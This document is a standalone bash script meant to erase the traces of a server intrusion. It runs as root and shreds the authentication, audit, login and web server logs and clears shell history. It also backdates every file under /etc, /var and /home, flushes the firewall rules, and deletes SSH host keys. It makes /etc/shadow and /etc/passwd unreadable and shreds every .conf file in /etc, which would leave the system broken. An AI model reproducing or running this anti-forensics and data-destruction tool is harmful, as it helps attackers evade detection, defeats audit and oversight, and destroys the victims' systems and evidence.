#!/bin/bash

# Check if the script is run as ROOT
if [[ $EUID -ne 0 ]]; then
   echo "[!] This script must be run as ROOT."
   exit 1
fi

echo "[*] Starting advanced trace removal on the server..."

# -------------------------
# Remove common logs
# -------------------------
echo "[*] Deleting common logs..."
log_files=(
  "/var/log/auth.log"
  "/var/log/syslog"
  "/var/log/messages"
  "/var/log/secure"
  "/var/log/wtmp"
  "/var/log/btmp"
  "/var/log/utmp"
  "/var/log/audit/audit.log"
  "/var/log/nginx/access.log"
  "/var/log/nginx/error.log"
  "/var/log/httpd/access_log"
  "/var/log/httpd/error_log"
)

for log in "${log_files[@]}"; do
  if [ -f "$log" ]; then
    shred -u -z "$log"
    echo "[✔️] Deleted log: $log"
  fi
done

# -------------------------
# Clear command history
# -------------------------
echo "[*] Clearing command history..."
history -c && shred -u -z ~/.bash_history
unset HISTFILE

# -------------------------
# Hide suspicious processes
# -------------------------
echo "[*] Hiding suspicious processes..."
processes=("ssh" "nc" "python" "bash" "perl" "ruby" "netcat")
for proc in "${processes[@]}"; do
  pkill -f "$proc" &> /dev/null
done

# -------------------------
# Modify file timestamps
# -------------------------
echo "[*] Modifying timestamps for files..."
find /etc /var /home -type f -exec touch -t 202201010101 {} \;

# -------------------------
# Remove temporary files and networks
# -------------------------
echo "[*] Deleting temporary files and networks..."
rm -rf /tmp/* /var/tmp/* /dev/shm/*

# -------------------------
# Clean firewall settings
# -------------------------
echo "[*] Cleaning firewall settings..."
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X

# -------------------------
# Remove suspicious users
# -------------------------
echo "[*] Deleting suspicious users..."
for user in "test" "backdoor" "hacker"; do
  deluser --remove-home "$user" &> /dev/null
done

# -------------------------
# Delete SSH keys and user authentications
# -------------------------
echo "[*] Deleting stored SSH keys..."
rm -rf ~/.ssh/* /root/.ssh/* /etc/ssh/ssh_host_*

# -------------------------
# Modify permissions for sensitive files
# -------------------------
echo "[*] Modifying permissions for sensitive files..."
chmod 000 /etc/shadow /etc/passwd /root/.bash_history

# -------------------------
# Delete sensitive configuration files
# -------------------------
echo "[*] Deleting sensitive configuration files..."
find /etc -type f \( -name "*.conf" -o -name "*.log" -o -name "*.bak" \) -exec shred -u -z {} \;

# -------------------------
# Clear advanced network traces
# -------------------------
echo "[*] Clearing advanced network traces..."
shred -u -z /var/log/wtmp
shred -u -z /var/log/btmp
shred -u -z /var/log/utmp

# -------------------------
# Task completion confirmation
# -------------------------
echo "[✔️] Traces successfully removed! No traces remain."
exit 0
